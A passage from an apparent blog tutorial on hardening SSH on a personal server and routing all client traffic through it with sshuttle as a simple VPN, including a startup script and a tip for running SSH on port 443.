&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim ~/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Save the file and exit, and change again the permissions to restrict access to the file:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;chmod &lt;/span&gt;600 ~/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now return to the root user:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The last step with SSH is to edit sshd_config in order to restrict the access via the created user and the corresponding public key:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim /etc/ssh/sshd_config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Look up and change appropriately the following lines in this file. Make sure they are not commented as well (not beginning with &lt;strong&gt;#&lt;/strong&gt;):&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;PasswordAuthentication no
PubkeyAuthentication &lt;span class="nb"&gt;yes
&lt;/span&gt;ChallengeResponseAuthentication no
PermitRootLogin no
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We&amp;#39;re almost done, but keep in mind that we have to allow incoming SSH connections with UFW:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ufw limit ssh/tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;limit&lt;/strong&gt; setting here will ban any IP attempting and failing to connect repeatedly. Combined with our changes on sshd_config, this is more than enough to protect this opened port.&lt;/p&gt;

&lt;p&gt;Last step for good measure is upgrading the system and rebooting the server:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;apt-get dist-upgrade &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; shutdown &lt;span class="nt"&gt;-r&lt;/span&gt; now
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After reboot, make sure that you cannot SSH to the server with root, and connect with the created user instead:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ssh your-user@my-droplet-ip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We&amp;#39;re 100% done with our server, unless you&amp;#39;re interested in the misc part at the end of this article. Let&amp;#39;s move on to the client side.&lt;/p&gt;

&lt;h2&gt;Setting up sshuttle&lt;/h2&gt;

&lt;p&gt;Sshuttle is already available on most package managers. On archlinux, you can easily get it with &lt;code&gt;yay&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;yay sshuttle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Keep in mind that sshuttle doesn&amp;#39;t tunnel UDP traffic (except DNS) by default. A bit of extra work is needed on that part with tproxy, as described in the documentation: &lt;a href="https://sshuttle.readthedocs.io/en/stable/tproxy.html" rel="nofollow"&gt;https://sshuttle.readthedocs.io/en/stable/tproxy.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basically it boils down to the following steps:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Run the following command as root after booting up:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ip route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
ip rule add fwmark 1 lookup 100
ip &lt;span class="nt"&gt;-6&lt;/span&gt; route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
ip &lt;span class="nt"&gt;-6&lt;/span&gt; rule add fwmark 1 lookup 100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;Run sshuttle as root with the tproxy method:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;&lt;span class="nv"&gt;SSH_AUTH_SOCK&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$SSH_AUTH_SOCK&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; sshuttle &lt;span class="nt"&gt;--method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tproxy &lt;span class="se"&gt;\&lt;/span&gt;
                                             &lt;span class="nt"&gt;--disable-ipv6&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
                                             &lt;span class="nt"&gt;--dns&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
                                             &lt;span class="nt"&gt;--exclude&lt;/span&gt; your-server-ip &lt;span class="se"&gt;\&lt;/span&gt;
                                             &lt;span class="nt"&gt;-r&lt;/span&gt; your-user@your-server-ip 0/0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That one is quite a mouthful so let&amp;#39;s break it down:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SSH_AUTH_SOCK=&amp;quot;$SSH_AUTH_SOCK&amp;quot;&lt;/code&gt; ensures that you can connect normally with SSH despise running sshuttle as root.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--method=tproxy&lt;/code&gt; is here to, well, activate the tproxy method for UDP traffic.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--disable-ipv6&lt;/code&gt; is self-explanatory. Sadly, I found that my IPv6 address would leak otherwise, and I&amp;#39;m not sure what is causing this at the moment.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--dns&lt;/code&gt; is to forward all DNS requests through SSH.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--exclude your-server-ip&lt;/code&gt; is required when forwarding all your traffic with tproxy, to prevent sshuttle from intercepting SSH packets.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r your-user@your-server-ip 0/0&lt;/code&gt; finally, where to forward your entire traffic (represented here as 0/0).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since IPv6 can leak even with the &lt;code&gt;--disable-ipv6&lt;/code&gt; command, let&amp;#39;s disable it while using sshuttle. This can be achieved temporarily by running the following commands as root:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.all.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.default.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;span class="nb"&gt;sudo &lt;/span&gt;sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.lo.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is all nice and well but i don&amp;#39;t see myself running all of this at each boot, so let&amp;#39;s wrap everything we mentioned in a script:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="c"&gt;#!/usr/bin/env bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$EUID&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; &lt;span class="nt"&gt;-ne&lt;/span&gt; 0 &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then
    &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"This script must be run as root. Exiting."&lt;/span&gt;
    &lt;span class="nb"&gt;exit
&lt;/span&gt;&lt;span class="k"&gt;fi

&lt;/span&gt;ip route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
ip rule add fwmark 1 lookup 100
ip &lt;span class="nt"&gt;-6&lt;/span&gt; route add &lt;span class="nb"&gt;local &lt;/span&gt;default dev lo table 100
ip &lt;span class="nt"&gt;-6&lt;/span&gt; rule add fwmark 1 lookup 100

sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.all.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.default.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1
sysctl &lt;span class="nt"&gt;-w&lt;/span&gt; net.ipv6.conf.lo.disable_ipv6&lt;span class="o"&gt;=&lt;/span&gt;1

sshuttle &lt;span class="nt"&gt;--method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tproxy &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--disable-ipv6&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--dns&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;-e&lt;/span&gt; &lt;span class="s2"&gt;"sudo -u your-user ssh"&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--daemon&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--pidfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/your-user/sshuttle.pid &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;--exclude&lt;/span&gt; your-server-ip &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nt"&gt;-r&lt;/span&gt; your-user@your-server-ip 0/0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Three options have been added here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--daemon&lt;/code&gt; to run sshuttle in background.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--pidfile&lt;/code&gt; to put a file containing shuttle&amp;#39;s PID in a defined path. Change the latter according to your needs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;-e&lt;/code&gt; flag will allow you to run the command as your main user and prompt for your SSH passphrase. This will use the right SSH pubkey to connect, even if ssh-agent isn&amp;#39;t loaded yet and sshuttle is ran as root.&lt;/p&gt;

&lt;p&gt;Stopping the VPN is easy: just &lt;code&gt;kill&lt;/code&gt; the PID given in &lt;code&gt;sshuttle.pid&lt;/code&gt;. This can be automated with the following alias, ran as root:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="nv"&gt;vpndown&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"kill '&lt;/span&gt;&lt;span class="si"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;cat&lt;/span&gt; /home/your-user/sshuttle.pid&lt;span class="si"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;'"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You should now be all set, just by adding the previous script in your &lt;code&gt;$path&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Misc: accessing the VPN when the SSH port is blocked&lt;/h2&gt;

&lt;p&gt;If you want to connect on WiFi hotspots, you might want to change the SSH port to 443 on your server as it is nearly guaranteed to be always opened, no matter how strict the WiFi&amp;#39;s firewall is.&lt;/p&gt;

&lt;p&gt;We have to change SSH&amp;#39;s default port on our server:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;vim /etc/ssh/sshd_config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Find and change the following line accordingly. Uncomment it if necessary:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Port 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;One thing left now is to change UFW rules on your server to open that port:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw limit &lt;span class="k"&gt;in &lt;/span&gt;443/tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Don&amp;#39;t forget to remove port 22 on ufw:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw status numbered
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Delete related rules with their IDs:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;ufw delete &amp;lt;rule-id-here&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now restart the sshd service:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;service sshd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now, the only thing left is to specify the 443 port in the sshuttle script:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;-r your-user@your-server-ip:443 0/0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The VPN should now be accessible from almost everywhere.&lt;/p&gt;
</content>
  </entry>
</feed>

